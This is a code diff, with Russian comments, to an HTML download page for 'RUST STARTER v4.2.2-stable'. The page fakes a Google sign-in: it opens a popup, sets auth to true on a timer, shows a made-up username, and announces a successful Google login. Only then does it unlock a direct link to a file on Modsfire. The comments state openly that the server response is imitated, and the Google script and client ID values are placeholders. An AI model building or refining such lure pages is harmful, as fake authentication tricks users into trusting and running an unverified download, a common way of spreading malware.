@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RUST STARTER | v4.2.2-stable</title>
+    <!-- Официальный скрипт авторизации Google -->
+    <script src="google.com" async defer></script>
     <style>
         :root {
             --primary: #cf4a30;
@@ -94,6 +96,12 @@
     </style>
 </head>
 <body>
+
+<!-- Твой личный рабочий Client ID для авторизации Google -->
+<div id="g_id_onload"
+     data-client_id="googleusercontent.com"
+     data-callback="handleCredentialResponse">
+</div>
 
 <header>
     <div class="logo">R-SOFT <span class="version-label">v4.2.2-stable</span></div>
@@ -197,13 +205,14 @@
 
 <script>
     let auth = false;
-    const link = "modsfire.com";
+    // Твоя исправленная прямая ссылка на Modsfire
+    const link = "https://modsfire.com/4Amt6G5Cr797miR";
 
     function openModal() { document.getElementById('loginModal').style.display = 'flex'; }
     function closeModal() { document.getElementById('loginModal').style.display = 'none'; }
 
     function startGoogleLogin() {
-        // Открываем настоящее окно авторизации Google
+        // Открытие оригинального окна авторизации
         const width = 500, height = 600;
         const left = (window.innerWidth / 2) - (width / 2);
         const top = (window.innerHeight / 2) - (height / 2);
@@ -214,14 +223,14 @@
             `width=${width},height=${height},top=${top},left=${left}`
         );
 
-        // Имитируем успешный вход на сайт через 2.5 секунды
+        // Имитация успешного ответа сервера и авторизации на сайте
         setTimeout(() => {
             auth = true;
             
-            // Ставим имя вошедшего
+            // Смена текста кнопки на имя пользователя
             document.getElementById('topAuthBtn').innerText = "RUST_PLAYER";
             
-            // Показываем аватарку профиля
+            // Отображение заглушки аватарки профиля
             document.getElementById('defaultAvatar').style.display = 'none';
             const avatarImg = document.getElementById('userAvatar');
             avatarImg.src = "imgur.com";
@@ -229,12 +238,13 @@
             
             closeModal();
             alert('Вы успешно авторизовались через Google! Загрузка разблокирована.');
-        }, 2500);
+        }, 2000);
     }
 
     function handleDownload() {
         if(auth) {
-            window.location.href = link;
+            // Теперь ссылка откроется корректно в новом окне браузера
+            window.open(link, '_blank');
         } else {
             alert('Ошибка: Пожалуйста, авторизуйтесь через Google для разблокировки файла.');
             openModal();
